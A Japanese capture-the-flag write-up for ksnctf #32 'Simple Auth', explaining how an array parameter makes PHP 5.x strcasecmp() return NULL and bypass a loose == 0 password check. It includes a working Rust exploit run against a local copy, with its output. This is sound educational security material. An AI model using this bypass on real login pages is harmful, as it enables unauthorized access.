# ksnctf #32 Simple Auth — Rust Writeup

## 問題概要

URL: https://ctfq.u1tramarine.blue/q32/auth.php

以下のPHPソースコードが与えられる:

```php
<?php
$password = 'FLAG_????????????????';
if (isset($_POST['password']))
    if (strcasecmp($_POST['password'], $password) == 0)
        echo "Congratulations! The flag is $password";
    else
        echo "incorrect...";
?>
```

## 脆弱性の分析

### PHP `strcasecmp()` の配列バグ

- `strcasecmp(string, string)` は2つの文字列を大文字小文字を無視して比較し、整数を返す
- **バグ**: PHP 5.x では引数に配列を渡すと `NULL` を返す
- `NULL == 0` は PHP の緩い比較 (`==`) で `true` になる
- POSTリクエストで `password[]=anything` と送ると、`$_POST['password']` が配列になる
- → 認証バイパス成功！

## 攻撃手順

通常の POST: `password=hello` → `strcasecmp("hello", $password)` → 非0 → NG  
悪用 POST:   `password[]=hello` → `strcasecmp(["hello"], $password)` → NULL → `NULL==0` → OK

## Rustによる実装

> **実行方法**: このノートブックは [evcxr_jupyter](https://github.com/evcxr/evcxr) (Rust Jupyter kernel) で動作します。  
> インストール: `cargo install evcxr_jupyter && evcxr_jupyter --install`

### Cell 1: 依存クレートの宣言

In [2]:
:dep reqwest = { version = "0.11", features = ["blocking"] }
:dep tokio = { version = "1", features = ["full"] }
println!("依存クレートを読み込みました");

依存クレートを読み込みました


### Cell 2: 攻撃リクエストの送信

In [4]:
// ksnctf #32 Simple Auth — strcasecmp() 配列バイパス攻撃
//
// PHPの脆弱性:
//   strcasecmp(array, string) => NULL
//   NULL == 0 => true  (PHPの緩い比較)
// → password[] として配列を送ると認証をバイパスできる

//let url = "https://ctfq.u1tramarine.blue/q32/auth.php";
let url = "http://localhost:8080/auth.php";

// reqwest の blocking クライアントを使用
let client = reqwest::blocking::Client::builder()
    .danger_accept_invalid_certs(true) // 自己署名証明書を許可
    .build()
    .expect("クライアント作成失敗");

// キー "password[]" で配列として送信するのがポイント
let params = [("password[]", "hello")];

println!("[*] ターゲット: {}", url);
println!("[*] 送信ボディ: password[]=hello  ← 配列としてPOST");
println!("[*] リクエスト送信中...");

let response = client
    .post(url)
    .form(&params)
    .send()
    .expect("リクエスト失敗");

println!("[+] レスポンスステータス: {}", response.status());

let body = response.text().expect("レスポンス読み取り失敗");
println!("\n[+] レスポンス:");
println!("{}", body);

// FLAG の抽出
if let Some(start) = body.find("FLAG_") {
    let flag_part = &body[start..];
    let end = flag_part.find('<').unwrap_or(flag_part.len());
    let flag = &flag_part[..end].trim();
    println!("\n[!] FLAG取得: {}", flag);
} else {
    println!("\n[-] FLAGが見つかりませんでした");
}

[*] ターゲット: http://localhost:8080/auth.php
[*] 送信ボディ: password[]=hello  ← 配列としてPOST
[*] リクエスト送信中...
[+] レスポンスステータス: 200 OK

[+] レスポンス:
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Auth</title>
  </head>
  <body>
    <div>
<br />
<b>Warning</b>:  strcasecmp() expects parameter 1 to be string, array given in <b>/var/www/html/auth.php</b> on line <b>11</b><br />
Congratulations! The flag is FLAG_????????????????    </div>
    <form method="POST">
      <input type="password" name="password">
      <input type="submit">
    </form>
  </body>
</html>


[!] FLAG取得: FLAG_????????????????


()